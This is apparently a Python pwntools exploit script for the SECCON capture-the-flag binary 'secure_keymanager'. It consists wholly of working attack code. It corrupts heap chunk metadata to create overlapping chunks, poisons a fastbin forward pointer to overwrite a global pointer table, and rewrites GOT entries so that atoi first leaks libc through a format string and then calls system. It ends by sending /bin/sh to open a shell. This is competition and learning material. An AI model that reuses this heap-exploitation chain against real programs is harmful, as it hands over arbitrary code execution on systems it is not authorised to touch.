#!/usr/bin/python
from pwn import *
import sys

HOST = "secure_keymanager.pwn.seccon.jp"
PORT = 47225

ACCOUNT = "A" * 8 + p16(0x71)
PASS = "B" * 8 + "\x00"

def add_key(len, title, key):
    r.sendline("1")
    r.sendlineafter("...", str(len))
    r.sendlineafter("...", title)

    if (key != ""):
        r.sendlineafter("...", key)

    r.recvuntil(">> ")

def remove_key(idx):
    r.sendline("4")
    r.sendafter(">> ", ACCOUNT)
    r.sendafter(">> ", PASS)
    r.sendlineafter("...", str(idx))

    r.recvuntil(">> ")

def edit_key(idx, new_key, fakeAtoi=False):
    if fakeAtoi:
        r.sendline("...")
    else:
        r.sendline("3")

    r.sendafter(">> ", ACCOUNT)
    r.sendafter(">> ", PASS)
    
    if fakeAtoi:
        r.sendlineafter("...", "."*idx)
    else:
        r.sendlineafter("...", str(idx))
    
    r.sendlineafter("...", new_key)

    r.recvuntil(">> ")


def exploit(r):
    r.sendafter(">> ", ACCOUNT)
    r.sendafter(">> ", PASS)

    r.recvuntil(">> ")
    
    log.info("Create initial chunks (fastbins + blocker chunk)")
    add_key(-32, "A" * 8, "")

    add_key(100 - 32, "B" * 30, "C" * (100 - 32 - 2))
    add_key(100 - 32, "D" * 30, "E" * (100 - 32 - 2))
    add_key(400, "BLOCKER", "F"*100)

    log.info("Recreate first chunk and overwrite second chunk metadat")
    remove_key(0)

    add_key(-32, "A" * 24 + p8(0xe1), "")

    log.info("Remove second chunk (creates overlapped freed chunk)")
    remove_key(1)
    
    log.info("Remove third chunk (put to fastbin list)")
    remove_key(2)

    log.info("Create overlapping chunk and overwrite fastbin FD")

    payload = "A"*64
    payload += p64(0) + p64(0x71)    # Chunk 3 header
    payload += p64(0x6020c0)         # Chunk 3 FD

    add_key(184, "OVERWRITER", payload)

    log.info("Create chunk to get fake FD into fastbin")    
    add_key(100-32, "B"*30, "C")

    log.info("Create chunk to overwrite pointer table")

    payload1 = "A"*16
    payload1 += p64(0x602030)           # key0
    payload1 += p64(0xcafebabe)[:6]     # key1

    payload2 = p64(0xcafebabe)          # key2
    payload2 += p64(0xcafebabe)         # key3
    payload2 += p64(0xcafebabe)         # key4 (unusable)
    payload2 += p64(0xcafebabe)         # key5
    payload2 += p64(0xcafebabe)         # key6
    payload2 += p64(0xcafebabe)         # key7
    payload2 += p64(0x0101010101010101) # keymap

    add_key(100-32, payload1, payload2)

    log.info("Overwrite atoi with printf plt")

    newgot  = p64(e.plt["read"] + 6) + p64(e.plt["__libc_start_main"] + 6)
    newgot += p64(e.plt["strcmp"] + 6) + p64(e.plt["malloc"] +6)
    newgot += p64(e.plt["printf"] + 6)   

    edit_key(0, newgot)

    log.info("Leak LIBC with format string")

    r.sendline("%3$p")
    LIBCLEAK = int(r.recvline().strip(), 16)
    r.recvuntil(">> ")
    
    libc = ELF("./libc-2.23.so")
    libc.address = LIBCLEAK - 0xf7230

    log.info("LIBC leak        : %s" % hex(LIBCLEAK))
    log.info("LIBC             : %s" % hex(libc.address))

    log.info("Overwrite atoi with system")

    newgot  = p64(e.plt["read"] + 6) + p64(e.plt["__libc_start_main"] + 6)
    newgot += p64(e.plt["strcmp"] + 6) + p64(e.plt["malloc"] +6)
    newgot += p64(libc.symbols["system"])   

    edit_key(0, newgot, True)

    log.info("Send /bin/sh to trigger shell")
    r.sendline("/bin/sh")

    r.interactive()

    return

if __name__ == "__main__":
    e = ELF("./secure_keymanager")

    if len(sys.argv) > 1:
        r = remote(HOST, PORT)
        exploit(r)
    else:
        r = process("./secure_keymanager", env={"LD_PRELOAD": "./libc-2.23.so"})        
        print util.proc.pidof(r)
        pause()
        exploit(r)
